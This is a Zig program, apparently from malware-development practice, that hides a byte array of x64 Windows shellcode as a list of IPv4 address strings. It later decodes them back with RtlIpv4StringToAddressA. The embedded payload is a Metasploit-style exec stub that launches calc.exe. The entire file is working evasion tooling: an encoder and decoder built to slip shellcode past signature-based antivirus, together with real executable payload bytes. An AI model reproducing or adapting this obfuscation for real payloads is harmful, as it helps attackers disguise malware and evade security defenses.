const std = @import("std");
const win = @import("zigwin32").everything;
const assert = std.debug.assert;

const PSTR = win.PSTR;
const IN_ADDR = win.IN_ADDR;

const RtlIpv4StringToAddressA = win.RtlIpv4StringToAddressA;

fn generateIpv4(allocator: std.mem.Allocator, a: u8, b: u8, c: u8, d: u8) ![:0]u8 {
    return std.fmt.allocPrintZ(allocator, "{d}.{d}.{d}.{d}", .{ a, b, c, d });
}

fn generateIpv4Output(allocator: std.mem.Allocator, shell_code: []const u8) ![][:0]const u8 {
    assert(shell_code.len % 4 == 0);

    var ipv4_array = try std.ArrayList([:0]const u8).initCapacity(allocator, shell_code.len / 4);

    var i: usize = 0;
    while (i < shell_code.len) : (i += 4) {
        const ipv4 = try generateIpv4(allocator, shell_code[i], shell_code[i + 1], shell_code[i + 2], shell_code[i + 3]);
        ipv4_array.appendAssumeCapacity(ipv4);
    }

    return ipv4_array.toOwnedSlice();
}

pub fn ipv4Deobfuscation(allocator: std.mem.Allocator, ipv4_array: []const [:0]const u8) ![]u8 {
    var shell_code = try std.ArrayList(u8).initCapacity(allocator, ipv4_array.len * 4);
    errdefer shell_code.deinit();

    for (ipv4_array) |ipv4| {
        var addr: IN_ADDR = undefined;
        var terminator: ?PSTR = null;

        const status = RtlIpv4StringToAddressA(ipv4, 0, &terminator, &addr);
        if (status != 0) {
            std.debug.print("IPv4Deobfuscation Failed With Error Code: {d}\n", .{status});
            return error.IPv4DeobfuscationFailed;
        }

        shell_code.appendSliceAssumeCapacity(std.mem.asBytes(&addr));
    }

    return shell_code.toOwnedSlice();
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const shell_code = [_]u8{
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
        0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
        0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
        0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
        0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
        0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
        0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
        0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
        0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
        0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
        0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
        0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
        0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
        0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
        0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
    };

    std.debug.print("shell_code: {x}\n", .{shell_code});

    const ipv4_array = try generateIpv4Output(allocator, &shell_code);
    defer {
        for (ipv4_array) |ipv4| allocator.free(ipv4);
        allocator.free(ipv4_array);
    }

    std.debug.print("obfuscated shell_code = [", .{});
    for (ipv4_array, 0..) |ipv4, i| {
        if (i == ipv4_array.len - 1) std.debug.print("\"{s}\"", .{ipv4}) else std.debug.print("\"{s}\", ", .{ipv4});
    }
    std.debug.print("]\n", .{});

    const deobfuscated_shell_code = try ipv4Deobfuscation(allocator, ipv4_array);
    defer allocator.free(deobfuscated_shell_code);

    std.debug.print("deobfuscated_shell_code: {x}\n", .{deobfuscated_shell_code});
}
